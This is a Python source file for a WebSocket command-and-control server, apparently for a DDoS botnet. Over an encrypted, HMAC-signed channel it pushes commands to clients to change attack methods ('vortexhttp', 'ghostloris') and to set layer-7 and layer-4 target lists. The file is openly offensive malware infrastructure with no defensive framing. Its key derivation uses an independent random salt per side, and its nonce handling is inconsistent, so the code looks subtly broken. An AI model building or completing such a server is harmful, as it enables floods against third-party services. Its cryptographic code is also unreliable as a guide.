import asyncio
import websockets
import base64
import json
import zlib
import os
import time
from typing import Dict
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.hmac import HMAC
from cryptography.hazmat.backends import default_backend

# In-memory structured logging
log_buffer = []

class C2Server:
    def __init__(self):
        self.clients: Dict[str, Dict] = {}  # client_id -> {"ws", "shared_key", "hmac_key", "nonce"}
        self.private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
        self.commands = [
            {"command": "continue"},
            {"command": "update_methods", "methods": ["vortexhttp", "ghostloris"]},
            {"command": "update_targets", "targets_l7": ["httpbin.org"], "targets_l4": []},
            {"command": "stop"}
        ]
        self.command_index = 0

    def _derive_keys(self, shared_secret: bytes) -> tuple:
        """Derive AES and HMAC keys using HKDF."""
        hkdf = HKDF(
            algorithm=hashes.SHA256(),
            length=64,
            salt=os.urandom(16),
            info=b"chaosvortex_c2",
            backend=default_backend()
        )
        derived_key = hkdf.derive(shared_secret)
        return derived_key[:32], derived_key[32:]  # AES-256, HMAC-SHA256

    def _encrypt(self, data: bytes, shared_key: bytes, nonce: int) -> bytes:
        """AES-GCM encryption with 12-byte nonce."""
        compressed = zlib.compress(data)
        iv = os.urandom(12)
        nonce_bytes = nonce.to_bytes(12, "big")
        cipher = Cipher(algorithms.AES(shared_key), modes.GCM(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encryptor.authenticate_additional_data(nonce_bytes)
        ciphertext = encryptor.update(compressed) + encryptor.finalize()
        return base64.b64encode(iv + encryptor.tag + nonce_bytes + ciphertext)

    def _decrypt(self, data: bytes, shared_key: bytes, nonce: int) -> bytes:
        """AES-GCM decryption with decompression."""
        data = base64.b64decode(data)
        iv, tag, nonce_bytes, ciphertext = data[:12], data[12:28], data[28:40], data[40:]
        cipher = Cipher(algorithms.AES(shared_key), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        decryptor.authenticate_additional_data(nonce_bytes)
        compressed = decryptor.update(ciphertext) + decryptor.finalize()
        return zlib.decompress(compressed)

    def _sign_command(self, data: bytes, hmac_key: bytes) -> bytes:
        """HMAC command signature."""
        hmac = HMAC(hmac_key, hashes.SHA256(), backend=default_backend())
        hmac.update(data)
        return hmac.finalize()

    def _verify_command(self, data: bytes, signature: bytes, hmac_key: bytes) -> bool:
        """Verify HMAC signature."""
        hmac = HMAC(hmac_key, hashes.SHA256(), backend=default_backend())
        hmac.update(data)
        try:
            hmac.verify(signature)
            return True
        except:
            return False

    async def handle_client(self, websocket, path):
        """Handle WebSocket client connection."""
        client_id = f"client_{len(self.clients)}"
        try:
            # ECDH key exchange
            client_public_key = base64.b64decode(await websocket.recv())
            client_key = serialization.load_pem_public_key(client_public_key, default_backend())
            public_key = self.private_key.public_key().public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            await websocket.send(base64.b64encode(public_key))
            shared_secret = self.private_key.exchange(ec.ECDH(), client_key)
            shared_key, hmac_key = self._derive_keys(shared_secret)
            self.clients[client_id] = {"ws": websocket, "shared_key": shared_key, "hmac_key": hmac_key, "nonce": 0}
            log_buffer.append({"ts": time.time(), "level": "INFO", "msg": f"Client {client_id} connected"})

            # Handle messages
            async for message in websocket:
                client = self.clients.get(client_id)
                if not client:
                    break
                decrypted = self._decrypt(message, client["shared_key"], client["nonce"])
                client["nonce"] += 1
                data, signature = decrypted[:-32], decrypted[-32:]
                if self._verify_command(data, signature, client["hmac_key"]):
                    msg = json.loads(data.decode())
                    log_buffer.append({"ts": time.time(), "level": "INFO", "msg": f"Received from {client_id}: {msg}"})
                    if msg.get("status") == "ready":
                        # Send next command
                        cmd = self.commands[self.command_index % len(self.commands)]
                        cmd_data = json.dumps(cmd).encode()
                        cmd_sig = self._sign_command(cmd_data, client["hmac_key"])
                        client["nonce"] += 1
                        await websocket.send(self._encrypt(cmd_data + cmd_sig, client["shared_key"], client["nonce"]))
                        self.command_index += 1
                    elif msg.get("status") == "done":
                        log_buffer.append({"ts": time.time(), "level": "INFO", "msg": f"Client {client_id} done, logs: {msg.get('log', [])}"})
                else:
                    log_buffer.append({"ts": time.time(), "level": "ERROR", "msg": f"Invalid signature from {client_id}"})
        except Exception as e:
            log_buffer.append({"ts": time.time(), "level": "ERROR", "msg": f"Client {client_id} error: {str(e)}"})
        finally:
            if client_id in self.clients:
                del self.clients[client_id]
                log_buffer.append({"ts": time.time(), "level": "INFO", "msg": f"Client {client_id} disconnected"})

    async def start_server(self):
        """Start WebSocket server."""
        server = await websockets.serve(self.handle_client, "localhost", 8765)
        log_buffer.append({"ts": time.time(), "level": "INFO", "msg": "C2 server started on ws://localhost:8765"})
        await server.wait_closed()

def main():
    server = C2Server()
    asyncio.run(server.start_server())

if __name__ == "__main__":
    main()
